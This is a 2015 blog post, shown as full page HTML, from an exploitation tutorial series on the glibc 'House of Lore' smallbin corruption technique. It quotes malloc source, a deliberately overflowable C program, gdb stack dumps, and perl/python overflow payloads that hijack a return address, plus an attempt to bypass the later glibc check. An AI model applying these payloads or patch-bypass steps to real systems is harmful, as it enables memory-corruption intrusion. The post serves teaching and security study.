<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://gbmaster.wordpress.com/xmlrpc.php">

<title>x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and traditions &#8211; gb_master&#039;s /dev/null</title>
<link rel='dns-prefetch' href='//s2.wp.com' />
<link rel='dns-prefetch' href='//s1.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="gb_master&#039;s /dev/null &raquo; Feed" href="https://gbmaster.wordpress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="gb_master&#039;s /dev/null &raquo; Comments Feed" href="https://gbmaster.wordpress.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="gb_master&#039;s /dev/null &raquo; x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and&nbsp;traditions Comments Feed" href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/feed/" />
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
			<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s1.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1473172720h&ver=4.6.1-RC1-38499"}};
			!function(a,b,c){function d(a){var c,d,e,f,g,h=b.createElement("canvas"),i=h.getContext&&h.getContext("2d"),j=String.fromCharCode;if(!i||!i.fillText)return!1;switch(i.textBaseline="top",i.font="600 32px Arial",a){case"flag":return i.fillText(j(55356,56806,55356,56826),0,0),!(h.toDataURL().length<3e3)&&(i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,65039,8205,55356,57096),0,0),c=h.toDataURL(),i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,55356,57096),0,0),d=h.toDataURL(),c!==d);case"diversity":return i.fillText(j(55356,57221),0,0),e=i.getImageData(16,16,1,1).data,f=e[0]+","+e[1]+","+e[2]+","+e[3],i.fillText(j(55356,57221,55356,57343),0,0),e=i.getImageData(16,16,1,1).data,g=e[0]+","+e[1]+","+e[2]+","+e[3],f!==g;case"simple":return i.fillText(j(55357,56835),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode8":return i.fillText(j(55356,57135),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode9":return i.fillText(j(55358,56631),0,0),0!==i.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity","unicode9"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='all-css-0' href='https://s1.wp.com/_static/??-eJx9kFFqAzEMRC9UV5SmS/JRehbbK3adSLawZEJuX29CCCStf4RGmqfBhrO4WLJhNuDmhNqSssJZYmGnnAgvT+o9qr7B3xilEyoc0cTHk7uqF3ugsjxySp39rLBQCZ5GpyuSN5ydFLUnNcJiqdjnLN42B+OcPBJyt40wlulObe3anzOMuf1QCFJR1fXKqbGztQe9crcxSAuAGpvFFUsGtQvhKGPBjDX1xT/txv7w98du+tp/TrvD4fgLP8GzuQ==' type='text/css' media='all' />
<link rel='stylesheet' id='escutcheon-fonts-css'  href='https://fonts.googleapis.com/css?family=Oswald%3A400%2C300%2C700%7CAlegreya+Sans%3A400%2C400italic%2C700%2C700italic&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='all-css-2' href='https://s2.wp.com/_static/??-eJx9jMEKAjEMRH/IGBYq6kH8lt0Qu5G2KZuUxb+3IkhP3maY9wb3CqTFuTj6ypkNa1uQjZrTylpQCqH5KzHslTQfyeyAgkVdumi/8B2Gu9ygphalM5EVktLs0g/HAo80y/ZP3XhJGnuM2KmhfqR7vk3hdA3hcp7C8w3wf0ul' type='text/css' media='all' />
<link rel='stylesheet' id='print-css-3' href='https://s0.wp.com/wp-content/mu-plugins/global-print/global-print.css?m=1465851035h' type='text/css' media='print' />
<link rel='stylesheet' id='all-css-4' href='https://s0.wp.com/_static/??-eJx9i9EKwjAMRX/IGmVj80X8lqx0bSRNSpPh74sPIjLx6Z4L58CjhajiSRzqFhpvmcQAo5PKgv1Dx2h2gN96U/OwMlIHK9hJ8nv/VaaRkANr1u+zi7ykmgzKCJl1QX4Jt3o9j/M0DJdpPt2fxX5JuQ==' type='text/css' media='all' />
<script type='text/javascript' src='https://s0.wp.com/_static/??-eJyFj+sKwjAMhV/IrHib+kN8ltrFkdqbTevQpzcD/aEOhUDIyZfDiRoSUDCudsjKSl0q5tuzNZZn6hcAnvqsCzaewgs2MRQMZWR9PJJDqIxZ96KJ0SlOcCly8cgs0MT2PRKFK+HwF7NYkjZnyMh0/3L1FZKrPQVWGZ080MGY4WOSq4Pfz1dtu14sd5utfQAruHB+'></script>
<link rel='stylesheet' id='all-css-0' href='https://s1.wp.com/wp-content/mu-plugins/highlander-comments/style.css?m=1377793621h' type='text/css' media='all' />
<!--[if lt IE 8]>
<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s1.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' type='text/css' media='all' />
<![endif]-->
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://gbmaster.wordpress.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s1.wp.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='x86 Exploitation 101: &#8220;House of Force&#8221; &#8211; Jedi&nbsp;overflow' href='https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/' />
<link rel='next' title='x86 Exploitation 101: &#8220;House of Spirit&#8221; &#8211; Friendly stack&nbsp;overflow' href='https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/' />
<meta name="generator" content="WordPress.com" />
<link rel="canonical" href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" />
<link rel='shortlink' href='http://wp.me/p2cXqJ-7l' />
<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/1.0/?format=json&amp;url=https%3A%2F%2Fgbmaster.wordpress.com%2F2015%2F07%2F16%2Fx86-exploitation-101-house-of-lore-people-and-traditions%2F&amp;for=wpcom-auto-discovery" /><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/1.0/?format=xml&amp;url=https%3A%2F%2Fgbmaster.wordpress.com%2F2015%2F07%2F16%2Fx86-exploitation-101-house-of-lore-people-and-traditions%2F&amp;for=wpcom-auto-discovery" />
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and traditions" />
<meta property="og:url" content="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" />
<meta property="og:description" content="It&#8217;s time now to talk about one of the most obscure (probably) techniques described by Phantasmal Phantasmagoria in his &#8220;Malloc Maleficarum&#8221;: THE HOUSE OF LORE When the &#8220;Mal…" />
<meta property="article:published_time" content="2015-07-15T22:03:19+00:00" />
<meta property="article:modified_time" content="2015-08-03T20:58:24+00:00" />
<meta property="og:site_name" content="gb_master&#039;s /dev/null" />
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:site" content="@gb_master" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:creator" content="@gb_master" />
<meta property="fb:app_id" content="249643311490" />
<meta property="article:publisher" content="https://www.facebook.com/WordPresscom" />
<link rel="shortcut icon" type="image/x-icon" href="https://s2.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
<link rel="icon" type="image/x-icon" href="https://s2.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
<link rel="apple-touch-icon-precomposed" href="https://s0.wp.com/i/webclip.png" />
<link rel='openid.server' href='https://gbmaster.wordpress.com/?openidserver=1' />
<link rel='openid.delegate' href='https://gbmaster.wordpress.com/' />
<link rel="search" type="application/opensearchdescription+xml" href="https://gbmaster.wordpress.com/osd.xml" title="gb_master&#039;s /dev/null" />
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com" />
		<style type="text/css">
			.recentcomments a {
				display: inline !important;
				padding: 0 !important;
				margin: 0 !important;
			}

			table.recentcommentsavatartop img.avatar, table.recentcommentsavatarend img.avatar {
				border: 0px;
				margin: 0;
			}

			table.recentcommentsavatartop a, table.recentcommentsavatarend a {
				border: 0px !important;
				background-color: transparent !important;
			}

			td.recentcommentsavatarend, td.recentcommentsavatartop {
				padding: 0px 0px 1px 0px;
				margin: 0px;
			}

			td.recentcommentstextend {
				border: none !important;
				padding: 0px 0px 2px 10px;
			}

			.rtl td.recentcommentstextend {
				padding: 0px 10px 2px 0px;
			}

			td.recentcommentstexttop {
				border: none;
				padding: 0px 0px 0px 10px;
			}

			.rtl td.recentcommentstexttop {
				padding: 0px 10px 0px 0px;
			}
		</style>
		<meta name="application-name" content="gb_master&#039;s /dev/null" /><meta name="msapplication-window" content="width=device-width;height=device-height" /><meta name="msapplication-tooltip" content="... and I said, &quot;Hello, Satan. I believe it&#039;s time to go.&quot;" /><meta name="msapplication-task" content="name=Subscribe;action-uri=https://gbmaster.wordpress.com/feed/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="title" content="x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and&nbsp;traditions | gb_master&#039;s /dev/null on WordPress.com" />
<meta name="description" content="It&#039;s time now to talk about one of the most obscure (probably) techniques described by Phantasmal Phantasmagoria in his &quot;Malloc Maleficarum&quot;: THE HOUSE OF LORE When the &quot;Malloc Maleficarum&quot; was published, as it was a purely theoretical article, contained no real exploit implementations or practical examples. Things got a little bit better with blackngel&#039;s &quot;Malloc&hellip;" />
		<script type="text/javascript" src="//c.amazon-adsystem.com/aax2/amzn_ads.js"></script>
		<script type="text/javascript">
		try { amznads.getAds("3033"); } catch(e) { /* ignore */ }
		</script>
		<script type="text/javascript">
		try {
			var a9_p = amznads.getKeys(),
			_ipw_custom = {
				wordAds: '0',
				adSafe: '0',
				domain: 'gbmaster.wordpress.com',
				pageURL: 'https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/'
			};
			if("undefined"!=typeof a9_p&&""!=a9_p&&null!==a9_p&&"[object Array]"===Object.prototype.toString.call(a9_p)){var a="",b=0,c=a9_p.length;a9_p.sort();for(var d=0;d<c;d++){a9_p[d-b]=a9_p[d-b].replace(/a1x6p/,"a160x600p");var e=a9_p[d-b].split("p");e[0]==a&&(a9_p.splice(d-b,1),b++);a=e[0]}_ipw_custom.amznPay=a9_p};document.close();
		} catch(e) {}
		</script>		<!-- Criteo AdBlock Plus script-->
		<script type="text/javascript" src="https://static.criteo.net/js/ld/publishertag.js"></script>
		<!-- IPONWEB header script -->
		<script type="text/javascript">
			window.__ATA = {
				scriptSrc: '//s.pubmine.com/showad.js',
				slotPrefix: 'automattic-id-',
				initAd: function(o) {
					var o = o || {},
						g = window,
						d = g.document,
						wr = d.write,
						id = g.__ATA.id();
					wr.call(d, '<div id="' + id + '" data-section="' + (o.sectionId || 0) + '"' + (o.type ? ('data-type="' + o.type + '"') : '') + ' ' + (o.forcedUrl ? ('data-forcedurl="' + o.forcedUrl + '"') : '') + ' style="width:' + (o.width || 0) + 'px; height:' + (o.height || 0) + 'px;">');
					g.__ATA.displayAd(id);
					wr.call(d, '</div>');
					g.__ATA.displayAdBlockedAd( id, o );
				},
				displayAd: function(id) {
					window.__ATA.ids = window.__ATA.ids || {};
					window.__ATA.ids[id] = 1;
				},
				customParams: _ipw_custom,
				id: function() {
					return window.__ATA.slotPrefix + (parseInt(Math.random() * 10000, 10) + 1 + (new Date()).getMilliseconds());
				},
				displayAdBlockedAd: function( id, t ) {
					if ( true !== true ) {
						return;
					}

					if ( typeof Criteo !== 'object' ) {
						return;
					}

					if ( 300 === parseInt( t.width ) && 250 === parseInt( t.height ) ) {
						var wpa = document.getElementsByClassName( 'wpa' );
						for( var i = 0; i < wpa.length; i++ ) {
							wpa[i].style.setProperty( 'visibility', 'visible', 'important' );
							wpa[i].style.setProperty( 'display', 'inline-block', 'important' );
						}

						Criteo.DisplayAcceptableAdIfAdblocked( {
							zoneid: 388248,
							containerid: id,
							collapsecontainerifnotadblocked: false
						});
					}
				}
			};
			(function(d, ata) {
				var pr = "https:" === d.location.protocol ? "https:" : "http:",
					src = pr + ata.scriptSrc,
					st = "text/javascript";
				d.write('<scr' + 'ipt type="' + st + '" src="' + src + '"><\/scr' + 'ipt>');
			})(window.document, window.__ATA);
		</script>
		<script type="text/javascript">
		jQuery(window).ready(function () {
			jQuery("a.wpa-about").text("About these ads");
		});
		</script><link rel="amphtml" href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/amp/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
<script type="text/javascript">
	window.google_analytics_uacct = "UA-52447-2";
</script>

<script type="text/javascript">
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', 'UA-52447-2']);
	_gaq.push(['_setDomainName', 'wordpress.com']);
	_gaq.push(['_initData']);
	_gaq.push(['_trackPageview']);

	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
	})();
</script>
</head>

<body class="single single-post postid-455 single-format-standard mp6 customizer-styles-applied highlander-enabled highlander-dark">
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header" role="banner">
		<div class="navigation-wrapper">
						<nav id="site-navigation" class="main-navigation" role="navigation">
				<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Menu</button>
				<div class="menu"></div>
			</nav><!-- #site-navigation -->
		</div>

		<div class="site-branding">
									<h1 class="site-title"><a href="https://gbmaster.wordpress.com/" rel="home">gb_master&#039;s /dev/null</a></h1>
			<h2 class="site-description">&#8230; and I said, &quot;Hello, Satan. I believe it&#039;s time to go.&quot;</h2>
		</div><!-- .site-branding -->

	</header><!-- #masthead -->

	<div id="content" class="site-content">
	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
				<article id="post-455" class="post-455 post type-post status-publish format-standard hentry category-exploitation-2">

		<header class="entry-header">
			<div class="entry-meta">
				<span class="byline"> Written by <span class="author vcard"><a class="url fn n" href="https://gbmaster.wordpress.com/author/gbmaster/">gb_master</a></span></span><span class="posted-on"><a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" rel="bookmark"><time class="entry-date published" datetime="2015-07-16T00:03:19+00:00">July 16, 2015</time><time class="updated" datetime="2015-08-03T22:58:24+00:00">August 3, 2015</time></a></span>			</div><!-- .entry-meta -->
			<h1 class="entry-title">x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and&nbsp;traditions</h1>		</header><!-- .entry-header -->

		
		<div class="entry-wrapper">

			<div class="entry-content">
				<p>It&#8217;s time now to talk about one of the most obscure (probably) techniques described by Phantasmal Phantasmagoria in his &#8220;<a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank">Malloc Maleficarum</a>&#8220;:</p>
<h1>THE HOUSE OF LORE</h1>
<p>When the &#8220;Malloc Maleficarum&#8221; was published, as it was a purely theoretical article, contained no real exploit implementations or practical examples. Things got a little bit better with blackngel&#8217;s &#8220;<a href="http://phrack.org/issues/66/10.html" target="_blank">Malloc Des-Maleficarum</a>&#8220;, in which the author tried to analyze how this technique should be applied, but he wasn&#8217;t able to provide, again, any practical example. He did it, at last, in his Phrack&#8217;s article &#8220;<a href="http://phrack.org/issues/67/8.html" target="_blank">The House of Lore: Reloaded ptmalloc v2 &amp; v3: Analysis &amp; Corruption</a>&#8220;, in which he got managed to explore both the corruption of small and large bins in order to be able to control the return value of a <i>malloc()</i> call. The common point between the smallbin and the largebin&#8217;s corruption is to overwrite the metadata of a chunk previously processed by the <i>free()</i> function.</p>
<h2>Smallbin Corruption</h2>
<p>Ingredients:</p>
<ul>
<li>Two chunks are allocated and the first one is overflowable</li>
<li>The second chunk is freed</li>
<li>Another (potentially more) chunk, bigger than the second one, is allocated</li>
<li>A new chunk with the same size of the second one is allocated</li>
<li>Another chunk with the same size of the second one is allocated</li>
</ul>
<p>The glibc&#8217;s code (as usual, version 2.3.5) blamed for this bug starts at line #<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l3866" target="_blank">3866</a>:<span id="more-455"></span></p>
<blockquote>
<pre>Void_t*
_int_malloc(mstate av, size_t bytes)
{
  [...]

  checked_request2size(bytes, nb);

  [...]

  if ((unsigned long)(nb) &lt;= (unsigned long)(av-&gt;max_fast)) {
    [...]
  }

  [...]

  /*
    If a small request, check regular bin.  Since these "smallbins"
    hold one size each, no searching within bins is necessary.
    (For a large request, we need to wait until unsorted chunks are
    processed to find best fit. But for small ones, fits are exact
    anyway, so we can check now, which is faster.)
  */

  if (in_smallbin_range(nb)) {
    idx = smallbin_index(nb);
    bin = bin_at(av,idx);

    if ( (victim = last(bin)) != bin) {
      if (victim == 0) /* initialization check */
        malloc_consolidate(av);
      else {
        bck = victim-&gt;bk;
        set_inuse_bit_at_offset(victim, nb);
        bin-&gt;bk = bck;
        bck-&gt;fd = bin;

        if (av != &amp;main_arena)
	  victim-&gt;size |= NON_MAIN_ARENA;
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
    }
  }
</pre>
</blockquote>
<p>Reaching this code requires that the <i>malloc()</i> call requests more than the fastbin&#8217;s size, which is set, by default to 72 bytes (we&#8217;re talking here about the normalized size). Provided this, the <i>in_smallbin_range</i> just checks that the request meets the smallbins requirements: its size must be less than MIN_LARGE_SIZE (set, by default, to 512 bytes).</p>
<p>Phantasmal remembered us that, when a chunk is freed, it isn&#8217;t directly put into its corresponding bin, but it stays into a kind-of limbo: the &#8220;<em>unsorted chunk</em>&#8221; bin. This bin is like a <strong>stack</strong> implemented as a doubly linked list and it&#8217;s used to potentially satisfy a subsequent <em>malloc()</em> request if the request matches the size of the unsorted-chunk&#8217;ed chunk. If it doesn&#8217;t, then the chunk is moved to its respective bin. This whole thing is done for performance purposes. So, for this exploitation technique to work, it is necessary that the chunk is put back into the bin: it means that another <em>malloc()</em> request must be performed after the chunk is freed and before the first chunk is filled with overflowing data. Also, the request must be for a bigger size of data than the freed chunk.</p>
<p>So, the code will try to check if there&#8217;s a chunk fitting the request into the smallbins by using the <i>idx = smallbin_index(nb)</i> and the <i>bin = bin_at(av,idx)</i> macros. The <i>last(b)</i> macro just returns the <i>bk</i> pointer of the chunk. If there were no available chunks, then the <i>bk</i> pointer would point to its own chunk. But if there is an available chunk (as we know there is), then the unlinking code is reached.</p>
<ol>
<li><i>bck = victim-&gt;bk</i>: <em>bck</em> points to the penultimate chunk</li>
<li><i>bin-&gt;bk = bck</i>: <em>bck</em> is now the last chunk</li>
<li><i>bck-&gt;fd = bin</i>: <em>fd</em> points to the new last chunk: <strong>this step requires that <em>victim-&gt;bk</em> points to an area of writable memory</strong></li>
</ol>
<p>One important thing should be kept in mind: when a chunk is taken from the &#8220;unsorted chunk&#8221; bin and put into its bin, it&#8217;s put as the first element. As we saw from the code, the <em>last()</em> macro will always take the last one. It might be necessary to perform several <em>malloc()</em> calls in order to have our freed chunk at the last place in the bin.</p>
<p>The resulting chunk is then transformed into a pointer by using the usual <em>chunk2mem(victim)</em> macro. Phantasmal said that the key for the Lore is to control the <em>bin-&gt;bk</em>: that&#8217;s why it is required that there is already a free chunk in the list, as a following overflow of the first chunk would overwrite the victim&#8217;s <em>bk</em> pointer.</p>
<p>After doing this, of course, the same freed chunk is returned by the <em>malloc()</em>. A subsequent request would re-perform the same exact steps, BUT, this time, even if the bin is empty, its <em>bk</em> pointer won&#8217;t point to the bin itself (as the previous step overwrote that pointer) and the allocator will think that there&#8217;s still one chunk inside. <strong>It&#8217;s important to remember that, again, <em>victim-&gt;bk</em> must point to a writable location</strong>. What happens next is pretty obvious: the <em>malloc()</em> function will return a chunk located at the value the original <em>bk</em> was overwritten with, plus 8 bytes. If <em>bk</em> was overwritten with a value pointing at the stack, well&#8230;</p>
<p>blackngel provided an example, matching all the requirements of the smallbin corruption approach:</p>
<blockquote>
<pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void evil_func(void)
{
  printf("\nThis is an evil function. You become a cool hacker if you are able to execute it.\n");
}

void func1(void)
{
  char *lb1, *lb2;

  lb1 = (char *) malloc(128);
  printf("LB1 -&gt; [ %p ]", lb1);
  lb2 = (char *) malloc(128);
  printf("\nLB2 -&gt; [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby? ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}

int main(int argc, char *argv[])
{
  char *buff1, *buff2, *buff3;

  malloc(4056);
  buff1 = (char *) malloc(16);
  printf("\nBuff1 -&gt; [ %p ]", buff1);
  buff2 = (char *) malloc(128);
  printf("\nBuff2 -&gt; [ %p ]", buff2);
  buff3 = (char *) malloc(256);
  printf("\nBuff3 -&gt; [ %p ]\n", buff3);

  free(buff2);

  printf("\nBuff4 -&gt; [ %p ]\n", malloc(1423));

  strcpy(buff1, argv[1]);

  func1();

  return 0;
}</pre>
</blockquote>
<p>As you can see, all the steps previously discussed are reported into this piece of code: the goal is to execute the <em>evil_func()</em> function. The idea is to overwrite <em>buff2-&gt;bk</em> by overflowing <em>buff1</em> at <em>strcpy</em> time and to have <em>lb2</em> pointing at the return value in the stack: at this point, it suffices just to input a new value for it at <em>fgets()</em> time.</p>
<p>By reading blackngel&#8217;s last paper, it&#8217;s easy to follow the steps he performed to write a working exploit. First thing, he needed the <em>evil_func()</em>&#8216;s return address location, which happened to be at 0xBFFFF35C. When choosing the value to overwrite <em>bk</em> with, he wrote in the paper the status of the stack at the beginning of <em>func1</em>:</p>
<blockquote>
<pre>(gdb) x/16x $ebp-32
0xbffff338:     0x00000000      0x00000000      0xbffff388      0x00743fc0
0xbffff348:     0x00251340      0x00182a20      0x00000000      0x00000000
0xbffff358:     0xbffff388      0x08048d1e      0x0804ffe8      0xbffff5d7
0xbffff368:     0x0804c0b0      0xbffff388      0x0013f345      0x08050088

EBP -&gt; 0xBFFFF358
RET -&gt; 0xBFFFF35C
</pre>
</blockquote>
<p>He said he chose 0xBFFFF33C for the overwriting process, but, in my opinion, this makes no sense, as, using that value, means that:</p>
<ol>
<li>During the first <em>malloc()</em> call inside <em>func1</em>, <em>bck</em> points at 0xBFFFF348</li>
<li>When trying to access to <em>bck-&gt;fd</em>, it will fail, as it&#8217;s likely that 0x00251340 (the content of 0xBFFFF348) is not a valid memory address</li>
</ol>
<p>So, I think he either meant to write 0xBFFFF34C or he reported a wrong stack layout. Let&#8217;s say that the stack dump is OK and that 0xBFFFF34C will be used: during the first call <em>bck</em> will point at 0xBFFFF358 and, when trying to access to <em>bck-&gt;fd</em>, everything will work fine, as 0xBFFFF390 (0xBFFFF388 + 8) is writable.</p>
<p>When the second <em>malloc()</em> request is performed, <em>victim</em> will be equal to 0xBFFFF34C and <em>victim-&gt;bk</em> to 0xBFFFF388 (an address with valid write permissions). At the end, the allocator will return 0xBFFFF354 (8 bytes before the return address in the stack).</p>
<blockquote><p>The values I computed and blackngel&#8217;s ones differ by 0x00000010. I really hope I got this one right.</p></blockquote>
<p>So, what&#8217;s left is the computation of the new return address, which, in blackngel&#8217;s own scenario, happened to be at 0x08048BA4</p>
<p>When he put everything&#8217;s together, what he got is (I slightly adapted his output):</p>
<blockquote>
<pre>black@odisea:~$ perl -e 'print "BBBBBBBB". "\xa4\x8b\x04\x08"' &gt; evil.in

...

(gdb) run `perl -e 'print "A"x28 . "\x4c\xf3\xff\xbf"'` &lt; evil.in

Buff1 -&gt; [ 0x804ffe8 ]
Buff2 -&gt; [ 0x8050000 ]
Buff3 -&gt; [ 0x8050088 ]

Buff4 -&gt; [ 0x8050190 ]
LB1 -&gt; [ 0x8050000 ]
LB2 -&gt; [ 0xbffff344 ]
Which is your favourite hobby?

This is an evil function. You become a cool hacker if you are able to execute it.

Program received signal SIGSEGV, Segmentation fault.
0x08048bb7 in evil_func ()
(gdb)
</pre>
</blockquote>
<p>In 2009, this vulnerability was patched with <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=f6887a0d9a55f5c80c567d9cb153c1c6582410f9" target="_blank">this</a> commit, which checks the usual consistency between the pointers of the list. At this point, blackngel gives a great hint:</p>
<blockquote><p>This check can still be overcome if you control an area into the stack and you can write an integer such that its value is equal to the address of the recently free chunk (victim). This must happen before the next call to malloc( ) with the same size requested.</p></blockquote>
<p>I tried to do this, but I found out that it&#8217;s not the only thing required: in fact you need to be able to control three integer values inside the <em>func1</em> stack frame. However, yes, with this additional requirement, it&#8217;s possible to have the House of Lore even with glibc 2.20. What I did is to modify the <em>func1</em> in the following way:</p>
<blockquote>
<pre>void func1()
{
  char *lb1, *lb2;

  unsigned int a = 0xAAAAAAAA;
  unsigned int b = 0xBBBBBBBB;
  unsigned int c = 0xCCCCCCCC;

  lb1 = (char *) malloc(128);
  printf("LB1 -&gt; [ %p ]", lb1);
  lb2 = (char *) malloc(128);
  printf("\nLB2 -&gt; [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby? ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}
</pre>
</blockquote>
<p>Yes, I know that manually setting the values inside the code itself is not a clean way of doing things, but I didn&#8217;t want to waste too much time by writing <em>fgets</em> and conversions from ASCII to integers. The concept still stays.<br />
The first thing to do is to overwrite <em>victim</em>&#8216;s bk pointer in such a way that <em>bck</em>&#8216;s fd value is located where <em>a</em> is. In order to do this, we need a layout of <em>func1</em>&#8216;s stack.</p>
<blockquote>
<pre>(gdb) x/20x 0xffffcf30
0xffffcf30:	0xf7e5d000	0x00000000	0x0804860c	0x00000080
0xffffcf40:	0xaaaaaaaa	0xbbbbbbbb	0xcccccccc	0x00000000
0xffffcf50:	0x0804874b	0xffffcf68	0x08048753	0x0804bfe8
0xffffcf60:	0x0804c000	0x0804c088	0x00000000	0xf7cdd943
0xffffcf70:	0x00000002	0xffffd004	0xffffd010	0xf7feb05e

RET -&gt; 0xFFFFCF58
</pre>
</blockquote>
<p>In order to have <em>bck</em>&#8216;s <em>fd</em> field located at 0xFFFFCF40 we need to overwrite <em>victim</em>&#8216;s <em>bk</em> with 0xFFFFCF38.</p>
<blockquote>
<pre>$ <strong>./hol `python -c 'import sys; sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x38\xCF\xFF\xFF")'`</strong>

Buff1 -&gt; [ 0x804bfe8 ]
Buff2 -&gt; [ 0x804c000 ]
Buff3 -&gt; [ 0x804c088 ]

Buff4 -&gt; [ 0x804c190 ]
*** Error in `./hol': malloc(): smallbin double linked list corrupted: 0x0804c000 ***
</pre>
</blockquote>
